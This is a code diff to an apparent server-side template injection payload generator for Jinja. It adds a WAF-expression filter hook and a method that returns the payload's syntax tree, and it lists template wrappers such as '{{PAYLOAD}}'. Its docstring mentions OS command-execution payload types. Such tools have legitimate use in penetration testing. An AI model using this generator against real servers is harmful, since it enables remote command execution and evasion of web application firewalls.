@@ -39,7 +39,11 @@ def get_outer_pattern(
         ("{{}}", "{{PAYLOAD}}", True),
         ("{%print()%}", "{%print(PAYLOAD)%}", True),
         ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
-        ("{%for x in ((),)%}x{%endfor%}", "{%for x in ((PAYLOAD),)%}x{%endfor%}", False),
+        (
+            "{%for x in ((),)%}x{%endfor%}",
+            "{%for x in ((PAYLOAD),)%}x{%endfor%}",
+            False,
+        ),
         ("{% set x= %}", "{% set x=PAYLOAD %}", False),
     ]
     for test_payload, outer_pattern, will_print in outer_payloads:
@@ -92,6 +96,12 @@ class FullPayloadGen:
         callback: Union[Callable[[str, Dict], None], None] = None,
         detect_mode: str = DETECT_MODE_ACCURATE,
         environment: str = ENVIRONMENT_JINJA,
+        waf_expr_func: Union[Callable[
+            [
+                str,
+            ],
+            bool,
+        ], None] = None
     ):
         self.__slot__ = [
             "waf_func",
@@ -101,6 +111,7 @@ class FullPayloadGen:
             "context",
             "outer_pattern",
             "will_print",
+            "waf_expr_func"
         ]
         self.waf_func = waf_func
         self.prepared = False
@@ -113,6 +124,7 @@ class FullPayloadGen:
         self.payload_gen = None
         self.detect_mode = detect_mode
         self.environment = environment
+        self.waf_expr_func = waf_expr_func
 
     @property
     def callback(self):
@@ -160,6 +172,7 @@ class FullPayloadGen:
             self.callback,
             detect_mode=self.detect_mode,
             environment=self.environment,
+            waf_expr_func=self.waf_expr_func
         )
         self.prepared = True
         self.callback(
@@ -200,7 +213,9 @@ class FullPayloadGen:
         self.context = context_payloads_to_context(self.context_payload)
         return True
 
-    def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
+    def generate_with_tree(
+        self, gen_type, *args
+    ) -> Union[Tuple[str, bool, payload_gen.TargetAndSubTargets], None]:
         """根据要求生成payload
 
         Args:
@@ -211,7 +226,7 @@ class FullPayloadGen:
                 payload, 以及payload是否会有回显
         """
         if not self.prepared and not self.do_prepare():
-            return None, None
+            return None
 
         assert self.payload_gen is not None, "when prepared, we should have payload_gen"
 
@@ -219,8 +234,8 @@ class FullPayloadGen:
 
         if ret is None:
             logger.warning("Bypassing WAF Failed.")
-            return None, None
-        inner_payload, used_context, _ = ret #TODO: 利用语法树信息
+            return None
+        inner_payload, used_context, tree = ret
         context_payload = "".join(
             filter_by_used_context(self.context_payload, used_context).keys()
         )
@@ -243,4 +258,19 @@ class FullPayloadGen:
                 colored("blue", self.outer_pattern),
                 colored("red", "will not print"),
             )
-        return (payload, self.will_print)
+        return (payload, self.will_print, tree)
+
+    def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
+        """根据要求生成payload
+
+        Args:
+            gen_type (str): 生成payload的类型，应传入如OS_POPEN_READ等在const.py中定义的类型
+
+        Returns:
+            Tuple[Union[str, None], Union[bool, None]]:
+                payload, 以及payload是否会有回显
+        """
+        result = self.generate_with_tree(gen_type, *args)
+        if result:
+            return result[:2]
+        return None, None
